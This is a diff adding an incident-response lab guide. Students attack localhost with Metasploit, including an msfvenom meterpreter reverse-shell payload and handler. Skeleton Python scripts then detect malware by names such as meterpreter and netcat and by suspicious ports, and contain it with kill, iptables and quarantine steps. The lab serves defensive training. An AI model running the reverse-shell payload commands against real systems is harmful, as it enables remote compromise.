@@ -1,0 +1,395 @@
+Incident Lifecycle and Containment
+Objectives
+By the end of this lab, students will be able to:
+
+Implement the complete incident response lifecycle: detection, containment, eradication, and recovery
+Simulate security incidents using Metasploit framework
+Develop automated containment procedures using Python
+Document incident response activities following DFIR standards
+Apply practical incident handling techniques in a controlled environment
+Prerequisites
+Basic Linux command line operations
+Fundamental network security concepts
+Python programming basics
+Understanding of incident response concepts
+Familiarity with common attack vectors
+Lab Environment
+Al Nafi Cloud Machine Setup: This lab runs entirely on Al Nafi's provided Linux-based cloud machines. Click Start Lab to access your pre-configured Ubuntu 20.04 LTS environment with Metasploit Framework, Python 3.8+, and required security tools pre-installed.
+
+Task 1: Simulate a Security Incident
+Step 1: Prepare Vulnerable Services
+Set up intentionally vulnerable services for testing:
+
+# Update system and install required packages
+sudo apt update
+sudo apt install -y metasploit-framework vsftpd apache2
+
+# Start vulnerable FTP service
+sudo systemctl start vsftpd
+sudo useradd -m ftpuser
+echo "ftpuser:password123" | sudo chpasswd
+
+# Start web server
+sudo systemctl start apache2
+Step 2: Initialize Metasploit Framework
+# Start PostgreSQL and initialize Metasploit database
+sudo systemctl start postgresql
+sudo msfdb init
+
+# Launch Metasploit console
+sudo msfconsole
+Step 3: Conduct Reconnaissance
+Within Metasploit console, scan for vulnerabilities:
+
+# Port scanning
+msf6 > use auxiliary/scanner/portscan/tcp
+msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 127.0.0.1
+msf6 auxiliary(scanner/portscan/tcp) > set PORTS 21,22,80,443
+msf6 auxiliary(scanner/portscan/tcp) > run
+
+# FTP version detection
+msf6 > use auxiliary/scanner/ftp/ftp_version
+msf6 auxiliary(scanner/ftp/ftp_version) > set RHOSTS 127.0.0.1
+msf6 auxiliary(scanner/ftp/ftp_version) > run
+Step 4: Execute Exploitation
+Create and deploy a test payload:
+
+# Generate malicious payload
+msf6 > msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf -o /tmp/test_payload
+
+# Set up listener
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 127.0.0.1
+msf6 exploit(multi/handler) > set LPORT 4444
+msf6 exploit(multi/handler) > exploit -j
+
+# In a new terminal, execute payload to simulate compromise
+chmod +x /tmp/test_payload
+/tmp/test_payload &
+Step 5: Document Initial Compromise
+Record the following information:
+
+Timestamp of compromise
+Attack vector used
+Services affected
+Initial indicators of compromise (IOCs)
+Exit Metasploit when done:
+
+msf6 > sessions -K
+msf6 > exit
+Task 2: Develop Incident Detection Script
+Step 1: Create Project Structure
+mkdir -p ~/incident_response/{scripts,logs,reports}
+cd ~/incident_response/scripts
+Step 2: Create Incident Detector Template
+Create incident_detector.py:
+
+#!/usr/bin/env python3
+"""
+Incident Detection Script
+TODO: Complete the implementation to detect security incidents
+"""
+
+import psutil
+import logging
+from datetime import datetime
+
+class IncidentDetector:
+    def __init__(self):
+        self.setup_logging()
+        self.suspicious_processes = []
+        self.network_connections = []
+        
+    def setup_logging(self):
+        """Configure logging for incident detection"""
+        # TODO: Set up logging to file and console
+        # Use: ../logs/incident_detection.log
+        pass
+    
+    def detect_suspicious_processes(self):
+        """
+        Monitor for suspicious processes
+        TODO: Implement process monitoring
+        - Check for processes with suspicious names: meterpreter, payload, nc
+        - Record PID, name, command line, and creation time
+        - Log warnings for suspicious processes
+        """
+        suspicious_names = ['meterpreter', 'payload', 'nc', 'netcat']
+        
+        # TODO: Iterate through running processes using psutil.process_iter()
+        # TODO: Check process names and command lines
+        # TODO: Add suspicious processes to self.suspicious_processes list
+        pass
+    
+    def detect_network_anomalies(self):
+        """
+        Monitor network connections for anomalies
+        TODO: Implement network monitoring
+        - Check for connections on suspicious ports: 4444, 5555, 6666
+        - Record local/remote addresses, status, and PID
+        - Log warnings for suspicious connections
+        """
+        suspicious_ports = [4444, 5555, 6666, 1234]
+        
+        # TODO: Use psutil.net_connections() to get active connections
+        # TODO: Check for ESTABLISHED connections on suspicious ports
+        # TODO: Add suspicious connections to self.network_connections list
+        pass
+    
+    def generate_incident_report(self):
+        """
+        Generate incident report in JSON format
+        TODO: Create comprehensive report with all findings
+        - Include timestamp, suspicious processes, network connections
+        - Save to: ../reports/incident_report_TIMESTAMP.json
+        """
+        # TODO: Create report dictionary
+        # TODO: Write to JSON file
+        # TODO: Return report
+        pass
+    
+    def run_detection(self):
+        """
+        Execute complete detection scan
+        TODO: Orchestrate all detection methods
+        - Run process detection
+        - Run network detection
+        - Generate report
+        - Return True if incidents found, False otherwise
+        """
+        # TODO: Call all detection methods
+        # TODO: Generate report
+        # TODO: Return incident status
+        pass
+
+if __name__ == "__main__":
+    # TODO: Create detector instance and run detection
+    # TODO: Exit with code 1 if incident found, 0 otherwise
+    pass
+Step 3: Install Dependencies
+pip3 install psutil
+chmod +x incident_detector.py
+Task 3: Develop Automated Containment Script
+Step 1: Create Containment Template
+Create containment_automation.py:
+
+#!/usr/bin/env python3
+"""
+Automated Incident Containment Script
+TODO: Complete the implementation for automated containment
+"""
+
+import os
+import json
+import subprocess
+import psutil
+import logging
+from datetime import datetime
+
+class IncidentContainment:
+    def __init__(self):
+        self.setup_logging()
+        self.containment_actions = []
+        self.quarantine_dir = "/tmp/quarantine"
+        
+    def setup_logging(self):
+        """
+        Configure logging for containment actions
+        TODO: Set up logging to ../logs/containment_actions.log
+        """
+        pass
+    
+    def kill_suspicious_processes(self, process_list):
+        """
+        Terminate suspicious processes
+        TODO: Implement process termination
+        - Iterate through process_list
+        - Use psutil to terminate each process by PID
+        - Try graceful termination first, then force kill
+        - Log all actions taken
+        """
+        # TODO: For each process in process_list:
+        #   - Check if PID exists
+        #   - Terminate process
+        #   - Record action in self.containment_actions
+        pass
+    
+    def block_network_connections(self, connection_list):
+        """
+        Block suspicious network connections using iptables
+        TODO: Implement network blocking
+        - Extract remote IP addresses from connection_list
+        - Use iptables to block outbound connections
+        - Command: sudo iptables -A OUTPUT -d <IP> -j DROP
+        """
+        # TODO: For each connection:
+        #   - Extract remote IP
+        #   - Execute iptables command
+        #   - Record action
+        pass
+    
+    def quarantine_suspicious_files(self):
+        """
+        Move suspicious files to quarantine
+        TODO: Implement file quarantine
+        - Check common locations: /tmp/test_payload, /tmp/payload
+        - Move files to quarantine directory
+        - Change permissions to prevent execution (chmod 000)
+        """
+        suspicious_locations = ['/tmp/test_payload', '/tmp/payload']
+        
+        # TODO: For each file location:
+        #   - Check if file exists
+        #   - Move to quarantine with timestamp
+        #   - Remove execute permissions
+        pass
+    
+    def create_system_snapshot(self):
+        """
+        Create system state snapshot for forensics
+        TODO: Capture system state
+        - Running processes: ps aux
+        - Network connections: netstat -tulpn
+        - Recent system logs: journalctl --since='1 hour ago'
+        - Save to: ../logs/system_snapshot_TIMESTAMP/
+        """
+        # TODO: Create snapshot directory
+        # TODO: Execute commands and save output
+        pass
+    
+    def execute_containment(self, incident_report_file):
+        """
+        Execute automated containment procedures
+        TODO: Orchestrate all containment actions
+        - Load incident report
+        - Create system snapshot
+        - Kill suspicious processes
+        - Block network connections
+        - Quarantine files
+        - Generate containment report
+        """
+        # TODO: Load incident report JSON
+        # TODO: Execute containment actions in order
+        # TODO: Generate and save containment report
+        pass
+
+if __name__ == "__main__":
+    # TODO: Accept incident report file as command line argument
+    # TODO: Execute containment
+    pass
+Step 2: Make Script Executable
+chmod +x containment_automation.py
+Task 4: Execute Complete Incident Response Lifecycle
+Step 1: Run Detection Phase
+cd ~/incident_response/scripts
+python3 incident_detector.py
+Expected output:
+
+Log file created in ../logs/incident_detection.log
+Incident report generated in ../reports/
+Exit code 1 if incidents detected
+Step 2: Run Containment Phase
+# Find the most recent incident report
+REPORT=$(ls -t ../reports/incident_report_*.json | head -1)
+
+# Execute containment
+python3 containment_automation.py $REPORT
+Expected actions:
+
+Suspicious processes terminated
+Network connections blocked
+Malicious files quarantined
+System snapshot created
+Step 3: Eradication Phase
+Manually remove remaining artifacts:
+
+# Remove any remaining malicious files
+sudo find /tmp -name '*payload*' -delete
+
+# Flush iptables rules (reset firewall)
+sudo iptables -F
+sudo iptables -X
+
+# Kill any remaining suspicious processes
+sudo pkill -f meterpreter
+Step 4: Recovery Phase
+Restore normal operations:
+
+# Restart essential services
+sudo systemctl restart ssh
+sudo systemctl restart apache2
+
+# Verify services are running
+sudo systemctl status ssh
+sudo systemctl status apache2
+
+# Run detection again to verify clean state
+python3 incident_detector.py
+Step 5: Document Incident Response
+Create final incident report in ../reports/final_report.txt:
+
+INCIDENT RESPONSE REPORT
+Date: [Current Date]
+Incident ID: [Generated ID]
+
+1. DETECTION
+   - Time detected: [Timestamp]
+   - Detection method: Automated scanning
+   - IOCs identified: [List processes, connections, files]
+
+2. CONTAINMENT
+   - Actions taken: [List all containment actions]
+   - Systems isolated: [List affected systems]
+   - Time to contain: [Duration]
+
+3. ERADICATION
+   - Malware removed: [List files removed]
+   - Vulnerabilities patched: [List patches applied]
+   - Accounts secured: [List account actions]
+
+4. RECOVERY
+   - Services restored: [List services]
+   - Verification performed: [Describe verification]
+   - Time to recover: [Duration]
+
+5. LESSONS LEARNED
+   - Root cause: [Analysis]
+   - Recommendations: [List improvements]
+   - Follow-up actions: [List tasks]
+Expected Outcomes
+Upon completion, students should have:
+
+Successfully simulated a security incident using Metasploit
+Developed functional incident detection script
+Created automated containment procedures
+Executed complete incident response lifecycle
+Generated comprehensive incident documentation
+Understanding of DFIR workflow and best practices
+Troubleshooting Tips
+Issue: Metasploit payload doesn't execute
+
+Solution: Check file permissions with ls -l, ensure executable bit is set
+Verify listener is running before executing payload
+Issue: Python script can't find psutil module
+
+Solution: Install with pip3 install --user psutil
+Verify installation with python3 -c "import psutil"
+Issue: Permission denied when running containment
+
+Solution: Some actions require sudo privileges
+Run script with: sudo python3 containment_automation.py
+Issue: No incidents detected after exploitation
+
+Solution: Ensure payload is still running with ps aux | grep payload
+Check if listener captured connection in Metasploit
+Conclusion
+This lab provided hands-on experience with the complete incident response lifecycle. Students simulated real-world security incidents, developed automated detection and containment tools, and practiced proper incident documentation. These skills are essential for security operations center (SOC) analysts and incident responders. Continue practicing by simulating different attack scenarios and refining your automation scripts.
+
+Key Takeaways:
+
+Incident response follows a structured lifecycle: Detection → Containment → Eradication → Recovery
+Automation accelerates response time and ensures consistency
+Proper documentation is critical for post-incident analysis
+System snapshots preserve forensic evidence
+Verification after recovery ensures complete remediation
